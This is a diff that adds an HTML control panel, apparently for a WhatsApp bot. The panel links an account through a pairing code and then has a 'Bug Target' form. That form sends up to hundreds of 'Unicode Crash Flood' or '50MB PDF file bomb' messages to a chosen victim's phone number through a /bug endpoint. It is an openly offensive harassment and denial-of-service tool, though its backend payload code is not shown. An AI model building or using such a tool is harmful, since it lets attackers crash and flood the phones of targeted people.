@@ -1,0 +1,29 @@
+<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>WA Panel</title>
+<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0d0d0d;color:#e0e0e0;font-family:sans-serif;padding:20px;max-width:460px;margin:0 auto}h1{color:#25d366;margin-bottom:20px;font-size:1.2rem;letter-spacing:2px}.card{background:#1a1a1a;border-radius:14px;padding:20px;margin-bottom:14px;border:1px solid #222}.card h2{font-size:.72rem;color:#555;text-transform:uppercase;letter-spacing:1px;margin-bottom:14px}.row{display:flex;align-items:center;gap:8px;margin-bottom:4px}.dot{width:9px;height:9px;border-radius:50%;background:#ff4444;flex-shrink:0}.dot.on{background:#25d366}input,select{width:100%;background:#111;border:1px solid #222;border-radius:8px;padding:11px 14px;color:#e0e0e0;font-size:.9rem;margin-bottom:10px;outline:none}input:focus,select:focus{border-color:#25d366}button{width:100%;padding:12px;border-radius:8px;border:none;font-size:.9rem;font-weight:700;cursor:pointer;margin-bottom:8px}.g{background:#25d366;color:#000}.s{background:#1f1f1f;color:#ccc;border:1px solid #333}.code{background:#111;border-radius:10px;padding:18px;text-align:center;font-size:2.2rem;font-weight:800;letter-spacing:10px;color:#25d366;margin-top:12px;display:none}.log{background:#111;border-radius:8px;padding:12px;font-size:.78rem;color:#25d366;font-family:monospace;margin-top:10px;min-height:36px;word-break:break-all}</style></head>
+<body>
+<h1>⬡ WA PANEL</h1>
+<div class="card">
+  <h2>Pairing</h2>
+  <div class="row"><div class="dot" id="dot"></div><span id="stxt">Disconnected</span></div><br>
+  <input id="pphone" placeholder="628xxxxxxxxxx">
+  <button class="g" onclick="doPair()">🔗 Generate Kode</button>
+  <div class="code" id="codeBox"></div>
+  <div class="log" id="plog">—</div>
+</div>
+<div class="card">
+  <h2>Bug Target</h2>
+  <input id="target" placeholder="628xxxxxxxxxx">
+  <input id="count" type="number" placeholder="Jumlah pesan (default 200)">
+  <select id="btype">
+    <option value="crash">Unicode Crash Flood</option>
+    <option value="filebomb">File Bomb 50MB PDF</option>
+  </select>
+  <button class="g" onclick="doBug()">⚡ SEND</button>
+  <div class="log" id="blog">—</div>
+</div>
+<script>
+async function check(){try{const r=await fetch('/status'),d=await r.json(),dot=document.getElementById('dot'),s=document.getElementById('stxt');if(d.connected){dot.classList.add('on');s.textContent='Connected'}else{dot.classList.remove('on');s.textContent='Disconnected'}}catch(e){}}
+async function doPair(){const p=document.getElementById('pphone').value.trim();if(!p)return;document.getElementById('plog').textContent='Generating...';document.getElementById('codeBox').style.display='none';const r=await fetch('/pair',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phone:p})});const d=await r.json();if(d.error){document.getElementById('plog').textContent='Error: '+d.error;return}const box=document.getElementById('codeBox');box.style.display='block';box.textContent=d.code;document.getElementById('plog').textContent='Masukkin kode: WA > Perangkat Tertaut > Tautkan dengan nomor telepon'}
+async function doBug(){const t=document.getElementById('target').value.trim(),c=parseInt(document.getElementById('count').value)||200,type=document.getElementById('btype').value;if(!t)return;document.getElementById('blog').textContent='Sending...';const r=await fetch('/bug',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({target:t,count:c,type})});const d=await r.json();document.getElementById('blog').textContent=d.error||d.status||'Sent: '+d.sent+' msg'}
+setInterval(check,2000);check()
+</script></body></html>
